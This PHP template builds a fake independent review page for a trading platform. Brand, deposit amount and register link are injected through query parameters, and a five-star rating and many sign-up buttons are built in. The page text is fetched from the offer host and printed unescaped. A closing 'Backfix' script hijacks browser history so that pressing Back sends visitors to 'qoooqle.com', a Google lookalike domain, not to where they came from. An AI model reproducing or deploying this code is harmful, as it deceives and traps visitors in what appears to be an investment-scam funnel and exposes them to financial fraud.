<?php
// ============================================================
// NEWSNIK 2 — Review Article Page
// Modeled after zergpool.com review layout
// ============================================================

if (file_exists(__DIR__ . '/config.php')) {
    require_once __DIR__ . '/config.php';
} else {
    require_once __DIR__ . '/../config.php';
}

// When deployed standalone on a shared newsnik domain, the register link must
// point back to whichever offer domain sent the visitor here (?host=...),
// since one deployment is reused across many future offers.
$_host_param = isset($_GET['host']) ? trim($_GET['host']) : '';
if ($_host_param !== '' && preg_match('/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $_host_param)) {
    $offer_register_url = 'https://' . $_host_param . '/register.php';
    // Also let ?lang= win over config's generic fallback language (get_active_lang
    // otherwise prioritizes $offer_lang, which is just 'en' on a standalone deploy).
    $offer_lang = '{{' . 'LANG}}';
}

// --- Read query parameters ---
$lang_param  = isset($_GET['lang'])  ? $_GET['lang']  : null;
$brand_param = isset($_GET['brand']) ? $_GET['brand'] : null;

// Resolve active language
$lang = get_active_lang($offer_lang, $lang_param);

// Resolve brand name (query param overrides config)
$brand = $brand_param ? htmlspecialchars(urldecode($brand_param), ENT_QUOTES, 'UTF-8') : $brand_name;

// --- Load translations ---
require_once __DIR__ . '/lang.php';

// Fallback to English if language key missing
$t = isset($content[$lang]) ? $content[$lang] : $content['en'];

// When standalone (host present), prefer this specific offer's freshly
// generated content (translated/unique per launch) over the static, shared
// fallback above — best-effort with a short timeout, never blocks the page.
if ($_host_param !== '' && function_exists('curl_init')) {
    $ch = curl_init('https://' . $_host_param . '/newsnik2_content.json');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    $body = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($body !== false && $http_code === 200) {
        $decoded = json_decode($body, true);
        if (is_array($decoded)) {
            $t = $decoded;
        }
    }
}

// --- Helper: replace {{BRAND}} / {{MIN_DEPOSIT}} / {{DEPOSIT_CURRENCY}} in any string or array ---
function replaceBrand($val, $brand, $min_dep, $dep_cur) {
    if (is_array($val)) {
        return array_map(function($v) use ($brand, $min_dep, $dep_cur) { return replaceBrand($v, $brand, $min_dep, $dep_cur); }, $val);
    }
    $val = str_replace('{{BRAND}}', $brand, $val);
    $val = str_replace('{{MIN_DEPOSIT}}', $min_dep, $val);
    $val = str_replace('{{DEPOSIT_CURRENCY}}', $dep_cur, $val);
    return $val;
}

// Replace {{BRAND}} / {{MIN_DEPOSIT}} / {{DEPOSIT_CURRENCY}} throughout
foreach ($t as $key => $val) {
    $t[$key] = replaceBrand($val, $brand, $min_deposit, $deposit_currency);
}

// Replace €250 with actual config value
$deposit_display = $deposit_currency === 'EUR' ? '€' . $min_deposit : $min_deposit . ' ' . $deposit_currency;

// Registration URL
$reg_url = htmlspecialchars($offer_register_url, ENT_QUOTES, 'UTF-8');

// HTML lang attribute
$html_lang = ($lang === 'cz') ? 'cs' : $lang;
?>
<!DOCTYPE html>
<html lang="<?php echo $html_lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $t['page_title']; ?></title>
    <meta name="description" content="<?php echo htmlspecialchars($t['meta_desc'], ENT_QUOTES, 'UTF-8'); ?>">
    <meta name="robots" content="noindex, nofollow">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&family=KoHo:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* ============================================================
           RESET & BASE
           ============================================================ */
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        html { scroll-behavior: smooth; }
        body {
            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 17px;
            line-height: 1.75;
            color: #1a1a2e;
            background: #f5f6fa;
            -webkit-font-smoothing: antialiased;
        }
        a { color: inherit; text-decoration: none; }
        img { max-width: 100%; height: auto; display: block; }

        /* ============================================================
           HEADER
           ============================================================ */
        .site-header {
            background: linear-gradient(135deg, #0d0e26 0%, #1a1547 50%, #2b246d 100%);
            padding: 0 24px;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 20px rgba(0,0,0,0.3);
        }
        .header-inner {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 68px;
        }
        .site-logo {
            font-family: 'KoHo', sans-serif;
            font-weight: 700;
            font-size: 24px;
            color: #fff;
            letter-spacing: -0.5px;
        }
        .site-logo span {
            background: linear-gradient(135deg, #00b09b, #96c93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .header-nav { display: flex; gap: 28px; align-items: center; }
        .header-nav a {
            color: rgba(255,255,255,0.75);
            font-size: 14px;
            font-weight: 500;
            transition: color 0.2s;
            letter-spacing: 0.3px;
        }
        .header-nav a:hover { color: #fff; }
        .header-cta {
            background: linear-gradient(135deg, #00b09b, #96c93d);
            color: #fff !important;
            padding: 8px 20px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 13px;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .header-cta:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 15px rgba(0,176,155,0.4);
            color: #fff !important;
        }

        /* Mobile menu toggle */
        .menu-toggle {
            display: none;
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
        }
        .menu-toggle span {
            display: block;
            width: 24px;
            height: 2px;
            background: #fff;
            margin: 5px 0;
            transition: 0.3s;
        }

        /* ============================================================
           HERO
           ============================================================ */
        .hero {
            background: linear-gradient(135deg, #0d0e26 0%, #1a1547 40%, #2b246d 70%, #3d2f8f 100%);
            padding: 60px 24px 50px;
            position: relative;
            overflow: hidden;
        }
        .hero::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -20%;
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, rgba(150,201,61,0.08) 0%, transparent 70%);
            border-radius: 50%;
        }
        .hero::after {
            content: '';
            position: absolute;
            bottom: -30%;
            left: -10%;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(0,176,155,0.06) 0%, transparent 70%);
            border-radius: 50%;
        }
        .hero-inner {
            max-width: 842px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }
        .hero-breadcrumb {
            font-size: 13px;
            color: rgba(255,255,255,0.5);
            margin-bottom: 20px;
        }
        .hero-breadcrumb a { color: rgba(255,255,255,0.6); }
        .hero-breadcrumb a:hover { color: #96c93d; }
        .hero-breadcrumb span { margin: 0 8px; }
        .hero h1 {
            font-family: 'KoHo', sans-serif;
            font-weight: 700;
            font-size: clamp(28px, 4vw, 42px);
            color: #fff;
            line-height: 1.2;
            margin-bottom: 24px;
            max-width: 720px;
        }
        .hero-meta {
            display: flex;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }
        .hero-author-avatar {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00b09b, #96c93d);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            color: #fff;
            font-size: 18px;
            flex-shrink: 0;
        }
        .hero-author-info { display: flex; flex-direction: column; }
        .hero-author-name {
            color: #fff;
            font-weight: 600;
            font-size: 15px;
        }
        .hero-author-details {
            color: rgba(255,255,255,0.55);
            font-size: 13px;
        }
        .hero-author-details span { margin: 0 6px; }

        /* ============================================================
           MAIN LAYOUT
           ============================================================ */
        .content-wrapper {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 24px 60px;
            display: grid;
            grid-template-columns: 1fr 300px;
            gap: 40px;
            align-items: start;
        }

        /* ============================================================
           ARTICLE
           ============================================================ */
        .article-body {
            max-width: 842px;
            min-width: 0;
        }
        .article-body h2 {
            font-family: 'KoHo', sans-serif;
            font-weight: 700;
            font-size: 28px;
            color: #0d0e26;
            margin: 44px 0 16px;
            padding-bottom: 10px;
            border-bottom: 3px solid #00b09b;
            display: inline-block;
        }
        .article-body h2:first-of-type { margin-top: 0; }
        .article-body h3 {
            font-family: 'KoHo', sans-serif;
            font-weight: 600;
            font-size: 22px;
            color: #1a1547;
            margin: 32px 0 12px;
        }
        .article-body p {
            margin-bottom: 18px;
            color: #2d2d44;
        }

        /* Summary Box */
        .summary-box {
            background: linear-gradient(135deg, #eef0ff 0%, #f0f8ff 50%, #edfcf5 100%);
            border: 1px solid rgba(0,176,155,0.15);
            border-radius: 16px;
            padding: 32px;
            margin-bottom: 36px;
        }
        .summary-box h3 {
            font-family: 'KoHo', sans-serif;
            color: #0d0e26;
            font-size: 22px;
            margin: 0 0 20px;
            padding-bottom: 12px;
            border-bottom: 2px solid rgba(0,176,155,0.2);
        }
        .summary-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px 24px;
        }
        .summary-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid rgba(0,0,0,0.06);
        }
        .summary-label {
            font-size: 14px;
            color: #666;
            font-weight: 500;
        }
        .summary-value {
            font-size: 15px;
            font-weight: 600;
            color: #0d0e26;
        }
        .summary-value.highlight {
            color: #00b09b;
        }
        .summary-value.verdict {
            background: linear-gradient(135deg, #00b09b, #96c93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }

        /* Numbered Steps */
        .steps-list {
            counter-reset: steps;
            list-style: none;
            margin: 20px 0 28px;
        }
        .steps-list li {
            counter-increment: steps;
            position: relative;
            padding: 16px 16px 16px 60px;
            margin-bottom: 12px;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            border: 1px solid rgba(0,0,0,0.06);
            font-size: 15px;
            color: #2d2d44;
            line-height: 1.65;
        }
        .steps-list li::before {
            content: counter(steps);
            position: absolute;
            left: 16px;
            top: 14px;
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, #00b09b, #96c93d);
            color: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 14px;
        }

        /* Pros / Cons Table */
        .pros-cons {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 24px 0 36px;
        }
        .pros-col, .cons-col {
            background: #fff;
            border-radius: 14px;
            padding: 24px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
            border: 1px solid rgba(0,0,0,0.06);
        }
        .pros-col { border-top: 4px solid #00b09b; }
        .cons-col { border-top: 4px solid #e74c3c; }
        .pros-col h3, .cons-col h3 {
            margin: 0 0 16px;
            font-size: 18px;
        }
        .pros-col h3 { color: #00b09b; }
        .cons-col h3 { color: #e74c3c; }
        .pros-col ul, .cons-col ul { list-style: none; }
        .pros-col li, .cons-col li {
            padding: 8px 0;
            font-size: 15px;
            color: #2d2d44;
            border-bottom: 1px solid rgba(0,0,0,0.05);
            line-height: 1.5;
        }
        .pros-col li:last-child, .cons-col li:last-child { border-bottom: none; }
        .pros-col li::before {
            content: '✅';
            margin-right: 10px;
        }
        .cons-col li::before {
            content: '❌';
            margin-right: 10px;
        }

        /* CTA Button */
        .cta-button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
            color: #fff;
            padding: 16px 36px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 17px;
            text-align: center;
            transition: transform 0.25s, box-shadow 0.25s;
            box-shadow: 0 4px 20px rgba(0,176,155,0.3);
            cursor: pointer;
            border: none;
            text-decoration: none;
            letter-spacing: 0.3px;
        }
        .cta-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(0,176,155,0.45);
            color: #fff;
        }
        .cta-button::after {
            content: ' →';
            margin-left: 8px;
            transition: transform 0.2s;
        }
        .cta-button:hover::after {
            transform: translateX(4px);
        }

        /* CTA Banner */
        .cta-banner {
            background: linear-gradient(135deg, #0d0e26 0%, #2b246d 100%);
            border-radius: 16px;
            padding: 36px 32px;
            text-align: center;
            margin: 40px 0;
            position: relative;
            overflow: hidden;
        }
        .cta-banner::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -30%;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(0,176,155,0.15), transparent 70%);
            border-radius: 50%;
        }
        .cta-banner p {
            color: rgba(255,255,255,0.85);
            font-size: 18px;
            margin-bottom: 20px;
            position: relative;
            z-index: 2;
        }
        .cta-banner .cta-button {
            position: relative;
            z-index: 2;
        }
        .cta-limited {
            color: rgba(255,255,255,0.55);
            font-size: 13px;
            margin-top: 14px !important;
            margin-bottom: 0 !important;
        }

        /* Section Cards */
        .section-card {
            background: #fff;
            border-radius: 14px;
            padding: 32px;
            margin: 28px 0;
            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
            border: 1px solid rgba(0,0,0,0.06);
        }
        .section-card h2 {
            margin-top: 0;
        }

        /* Author Bio */
        .author-bio {
            background: linear-gradient(135deg, #f8f9ff, #f0f8ff);
            border-radius: 16px;
            padding: 28px 32px;
            margin-top: 40px;
            display: flex;
            gap: 20px;
            align-items: flex-start;
            border: 1px solid rgba(0,176,155,0.1);
        }
        .author-bio-avatar {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00b09b, #96c93d);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            color: #fff;
            font-size: 24px;
            flex-shrink: 0;
        }
        .author-bio-content h4 {
            font-family: 'KoHo', sans-serif;
            font-size: 18px;
            color: #0d0e26;
            margin-bottom: 2px;
        }
        .author-bio-content .role {
            font-size: 13px;
            color: #00b09b;
            font-weight: 600;
            margin-bottom: 10px;
        }
        .author-bio-content p {
            font-size: 14px;
            color: #555;
            line-height: 1.65;
        }

        /* ============================================================
           SIDEBAR
           ============================================================ */
        .sidebar {
            position: sticky;
            top: 88px;
        }

        /* Table of Contents */
        .toc-box {
            background: #fff;
            border-radius: 14px;
            padding: 24px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
            border: 1px solid rgba(0,0,0,0.06);
            margin-bottom: 24px;
        }
        .toc-box h4 {
            font-family: 'KoHo', sans-serif;
            font-size: 16px;
            color: #0d0e26;
            margin-bottom: 14px;
            padding-bottom: 10px;
            border-bottom: 2px solid #00b09b;
        }
        .toc-box ul { list-style: none; }
        .toc-box li {
            margin-bottom: 8px;
        }
        .toc-box a {
            font-size: 14px;
            color: #555;
            display: block;
            padding: 6px 12px;
            border-radius: 8px;
            transition: all 0.2s;
            border-left: 3px solid transparent;
        }
        .toc-box a:hover {
            color: #00b09b;
            background: rgba(0,176,155,0.05);
            border-left-color: #00b09b;
        }

        /* Sidebar CTA */
        .sidebar-cta {
            background: linear-gradient(135deg, #0d0e26 0%, #2b246d 100%);
            border-radius: 14px;
            padding: 28px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .sidebar-cta::before {
            content: '';
            position: absolute;
            top: -40%;
            right: -40%;
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, rgba(0,176,155,0.12), transparent 70%);
            border-radius: 50%;
        }
        .sidebar-cta h4 {
            font-family: 'KoHo', sans-serif;
            color: #fff;
            font-size: 18px;
            margin-bottom: 10px;
            position: relative;
            z-index: 2;
        }
        .sidebar-cta p {
            color: rgba(255,255,255,0.65);
            font-size: 13px;
            margin-bottom: 18px;
            position: relative;
            z-index: 2;
            line-height: 1.5;
        }
        .sidebar-cta .cta-button {
            width: 100%;
            padding: 14px 20px;
            font-size: 14px;
            position: relative;
            z-index: 2;
        }
        .sidebar-rating {
            margin-top: 16px;
            position: relative;
            z-index: 2;
        }
        .sidebar-rating .stars {
            color: #f0c040;
            font-size: 20px;
            letter-spacing: 2px;
        }
        .sidebar-rating .score {
            color: rgba(255,255,255,0.7);
            font-size: 13px;
            margin-top: 4px;
        }

        /* ============================================================
           FOOTER
           ============================================================ */
        .site-footer {
            background: #0d0e26;
            padding: 40px 24px;
            margin-top: 0;
        }
        .footer-inner {
            max-width: 1200px;
            margin: 0 auto;
        }
        .footer-disclaimer {
            color: rgba(255,255,255,0.4);
            font-size: 12px;
            line-height: 1.7;
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.08);
        }
        .footer-bottom {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
        }
        .footer-copyright {
            color: rgba(255,255,255,0.35);
            font-size: 13px;
        }
        .footer-links {
            display: flex;
            gap: 24px;
        }
        .footer-links a {
            color: rgba(255,255,255,0.4);
            font-size: 13px;
            transition: color 0.2s;
        }
        .footer-links a:hover { color: rgba(255,255,255,0.7); }

        /* ============================================================
           RESPONSIVE
           ============================================================ */
        @media (max-width: 960px) {
            .content-wrapper {
                grid-template-columns: 1fr;
            }
            .sidebar {
                position: static;
                order: -1;
            }
            .toc-box { display: none; }
            .sidebar-cta { margin-bottom: 0; }
        }
        @media (max-width: 640px) {
            .header-nav { display: none; }
            .menu-toggle { display: block; }
            .hero { padding: 40px 16px 36px; }
            .hero h1 { font-size: 24px; }
            .summary-grid { grid-template-columns: 1fr; }
            .pros-cons { grid-template-columns: 1fr; }
            .content-wrapper { padding: 24px 16px 40px; }
            .article-body h2 { font-size: 22px; }
            .cta-button { font-size: 15px; padding: 14px 24px; width: 100%; }
            .author-bio { flex-direction: column; text-align: center; align-items: center; }
            .footer-bottom { flex-direction: column; text-align: center; }
        }
    </style>
</head>
<body>

    <!-- ============================================================
         HEADER
         ============================================================ -->
    <header class="site-header">
        <div class="header-inner">
            <a href="#" class="site-logo">Trading<span>Insights</span></a>
            <nav class="header-nav">
                <a href="#"><?php echo $t['nav_home']; ?></a>
                <a href="#"><?php echo $t['nav_reviews']; ?></a>
                <a href="#"><?php echo $t['nav_guides']; ?></a>
                <a href="#"><?php echo $t['nav_news']; ?></a>
                <a href="<?php echo $reg_url; ?>" class="header-cta"><?php echo $t['cta_button']; ?></a>
            </nav>
            <button class="menu-toggle" aria-label="Menu">
                <span></span><span></span><span></span>
            </button>
        </div>
    </header>

    <!-- ============================================================
         HERO
         ============================================================ -->
    <section class="hero">
        <div class="hero-inner">
            <div class="hero-breadcrumb">
                <a href="#"><?php echo $t['nav_home']; ?></a>
                <span>›</span>
                <a href="#"><?php echo $t['nav_reviews']; ?></a>
                <span>›</span>
                <?php echo $brand; ?>
            </div>
            <h1><?php echo $t['page_title']; ?></h1>
            <div class="hero-meta">
                <div class="hero-author-avatar">OG</div>
                <div class="hero-author-info">
                    <span class="hero-author-name"><?php echo $t['author_name']; ?> — <?php echo $t['author_role']; ?></span>
                    <span class="hero-author-details">
                        <?php echo $t['published_date']; ?>
                        <span>•</span>
                        <?php echo $t['reading_time']; ?>
                    </span>
                </div>
            </div>
        </div>
    </section>

    <!-- ============================================================
         MAIN CONTENT
         ============================================================ -->
    <div class="content-wrapper">
        <article class="article-body">

            <!-- Intro -->
            <p><?php echo $t['intro']; ?></p>

            <!-- Summary Box -->
            <div class="summary-box">
                <h3><?php echo $t['summary_title']; ?></h3>
                <div class="summary-grid">
                    <div class="summary-item">
                        <span class="summary-label"><?php echo $t['summary_platform']; ?></span>
                        <span class="summary-value"><?php echo $brand; ?></span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label"><?php echo $t['summary_type']; ?></span>
                        <span class="summary-value"><?php echo $t['summary_type_val']; ?></span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label"><?php echo $t['summary_deposit']; ?></span>
                        <span class="summary-value"><?php echo $deposit_display; ?></span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label"><?php echo $t['summary_assets']; ?></span>
                        <span class="summary-value"><?php echo $t['summary_assets_val']; ?></span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label"><?php echo $t['summary_rating']; ?></span>
                        <span class="summary-value highlight"><?php echo $t['summary_rating_val']; ?></span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label"><?php echo $t['summary_verdict']; ?></span>
                        <span class="summary-value verdict"><?php echo $t['summary_verdict_val']; ?></span>
                    </div>
                </div>
            </div>

            <!-- CTA 1 -->
            <div style="text-align: center; margin: 32px 0;">
                <a href="<?php echo $reg_url; ?>" class="cta-button"><?php echo $t['cta_button']; ?></a>
            </div>

            <!-- What is BRAND? -->
            <h2 id="what-is"><?php echo $t['what_is_title']; ?></h2>
            <p><?php echo $t['what_is_text']; ?></p>

            <!-- How does BRAND work? -->
            <h2 id="how-works"><?php echo $t['how_works_title']; ?></h2>
            <ol class="steps-list">
                <?php foreach ($t['how_works_steps'] as $step): ?>
                    <li><?php echo $step; ?></li>
                <?php endforeach; ?>
            </ol>

            <!-- CTA Banner -->
            <div class="cta-banner">
                <p><?php echo $t['cta_banner_text']; ?></p>
                <a href="<?php echo $reg_url; ?>" class="cta-button"><?php echo $t['cta_button']; ?></a>
                <p class="cta-limited"><?php echo $t['cta_limited']; ?></p>
            </div>

            <!-- Pros / Cons -->
            <h2 id="pros-cons"><?php echo $t['pros_title']; ?> & <?php echo $t['cons_title']; ?></h2>
            <div class="pros-cons">
                <div class="pros-col">
                    <h3>✅ <?php echo $t['pros_title']; ?></h3>
                    <ul>
                        <?php foreach ($t['pros'] as $pro): ?>
                            <li><?php echo $pro; ?></li>
                        <?php endforeach; ?>
                    </ul>
                </div>
                <div class="cons-col">
                    <h3>❌ <?php echo $t['cons_title']; ?></h3>
                    <ul>
                        <?php foreach ($t['cons'] as $con): ?>
                            <li><?php echo $con; ?></li>
                        <?php endforeach; ?>
                    </ul>
                </div>
            </div>

            <!-- Performance -->
            <div class="section-card">
                <h2 id="performance"><?php echo $t['performance_title']; ?></h2>
                <p><?php echo $t['performance_text']; ?></p>
            </div>

            <!-- Security -->
            <div class="section-card">
                <h2 id="security"><?php echo $t['security_title']; ?></h2>
                <p><?php echo $t['security_text']; ?></p>
            </div>

            <!-- User Experience -->
            <div class="section-card">
                <h2 id="ux"><?php echo $t['ux_title']; ?></h2>
                <p><?php echo $t['ux_text']; ?></p>
            </div>

            <!-- CTA 2 -->
            <div style="text-align: center; margin: 36px 0;">
                <a href="<?php echo $reg_url; ?>" class="cta-button"><?php echo $t['cta_button']; ?></a>
            </div>

            <!-- Conclusion -->
            <h2 id="conclusion"><?php echo $t['conclusion_title']; ?></h2>
            <p><?php echo $t['conclusion_text']; ?></p>

            <!-- Final CTA Banner -->
            <div class="cta-banner">
                <p><?php echo $t['cta_banner_text']; ?></p>
                <a href="<?php echo $reg_url; ?>" class="cta-button"><?php echo $t['cta_button']; ?></a>
                <p class="cta-limited"><?php echo $t['cta_limited']; ?></p>
            </div>

            <!-- Author Bio -->
            <div class="author-bio">
                <div class="author-bio-avatar">OG</div>
                <div class="author-bio-content">
                    <h4><?php echo $t['author_name']; ?></h4>
                    <div class="role"><?php echo $t['author_role']; ?></div>
                    <p><?php echo $t['author_bio']; ?></p>
                </div>
            </div>

        </article>

        <!-- ============================================================
             SIDEBAR
             ============================================================ -->
        <aside class="sidebar">
            <div class="toc-box">
                <h4><?php echo $t['toc_title']; ?></h4>
                <ul>
                    <li><a href="#what-is"><?php echo $t['what_is_title']; ?></a></li>
                    <li><a href="#how-works"><?php echo $t['how_works_title']; ?></a></li>
                    <li><a href="#pros-cons"><?php echo $t['pros_title']; ?> & <?php echo $t['cons_title']; ?></a></li>
                    <li><a href="#performance"><?php echo $t['performance_title']; ?></a></li>
                    <li><a href="#security"><?php echo $t['security_title']; ?></a></li>
                    <li><a href="#ux"><?php echo $t['ux_title']; ?></a></li>
                    <li><a href="#conclusion"><?php echo $t['conclusion_title']; ?></a></li>
                </ul>
            </div>

            <div class="sidebar-cta">
                <h4><?php echo $brand; ?></h4>
                <p><?php echo $t['cta_banner_text']; ?></p>
                <a href="<?php echo $reg_url; ?>" class="cta-button"><?php echo $t['cta_button']; ?></a>
                <div class="sidebar-rating">
                    <div class="stars">★★★★★</div>
                    <div class="score"><?php echo $t['summary_rating_val']; ?></div>
                </div>
            </div>
        </aside>
    </div>

    <!-- ============================================================
         FOOTER
         ============================================================ -->
    <footer class="site-footer">
        <div class="footer-inner">
            <p class="footer-disclaimer"><?php echo htmlspecialchars($t['footer_disclaimer'] ?? 'Risk Warning: Trading involves substantial risk.'); ?></p>
            <div class="footer-bottom">
                <span class="footer-copyright"><?php echo htmlspecialchars($t['footer_copyright'] ?? ('© ' . date('Y') . ' ' . $brand_name . '. All rights reserved.')); ?></span>
                <div class="footer-links">
                    <a href="#"><?php echo htmlspecialchars($t['footer_privacy'] ?? 'Privacy Policy'); ?></a>
                    <a href="#"><?php echo htmlspecialchars($t['footer_terms'] ?? 'Terms & Conditions'); ?></a>
                    <a href="#"><?php echo htmlspecialchars($t['footer_contact'] ?? 'Contact Us'); ?></a>
                </div>
            </div>
        </div>
    </footer>

    <!-- ============================================================
         BACKFIX SCRIPT (Ravelizio Version)
         ============================================================ -->
    <script>
    (function() {
        var SERP_DOMAIN = 'qoooqle.com';
        var searchParams = new URLSearchParams(window.location.search);
        var lang = searchParams.get('lang') || 'en';
        var host = searchParams.get('host');
        var brand = searchParams.get('brand') || '';
        var geo = searchParams.get('geo') || '';
        // No host means this standalone newsnik domain was hit directly (test/bot/bookmark),
        // not via a real offer's google.php link — there's no page to send them back to.
        var targetUrl;
        if (host) {
            var backParams = new URLSearchParams();
            backParams.set('lang', lang);
            backParams.set('host', host);
            if (brand) backParams.set('brand', brand);
            if (geo) backParams.set('geo', geo);
            targetUrl = 'https://' + SERP_DOMAIN + '/index.php?' + backParams.toString();
        } else {
            targetUrl = 'https://www.google.com';
        }
        var activated = false;

        function activateBackBlock() {
            if (activated) return;
            activated = true;
            console.log("[Backfix newsnik2] Скрипт активирован! Записываем историю...");

            /* --- OLD 15-LOOP VERSION (for rollback):
            for (var i = 0; i < 15; i++) {
                history.pushState(null, document.title, location.href);
            }
            window.addEventListener('popstate', function() {
                setTimeout(function() {
                    location.replace(targetUrl);
                }, 1);
            });
            ------------------------------------------ */

            // NEW Ravelizio 2-state Pattern with Hash Bypass
            try {
                history.pushState({backfixed: 1}, "", location.href);
                history.pushState({backfixed: 2}, "", location.href + "#back");
                console.log("[Backfix newsnik2] История с хэшем успешно записана. Ждем 'Назад'. Target: " + targetUrl);
            } catch (e) {
                console.log("[Backfix newsnik2] Ошибка pushState: ", e);
            }

            window.addEventListener('popstate', function(event) {
                console.log("[Backfix newsnik2] Событие popstate перехвачено!");
                console.log("[Backfix newsnik2] Перенаправляем на: " + targetUrl);
                setTimeout(function() {
                    window.location.href = targetUrl;
                }, 50);
            });
        }

        document.addEventListener('click', activateBackBlock, { once: true });
        window.addEventListener('scroll', function() {
            if (window.scrollY > 30) {
                activateBackBlock();
            }
        }, { once: true });
        setTimeout(activateBackBlock, 3000);
    })();
    </script>

</body>
</html>
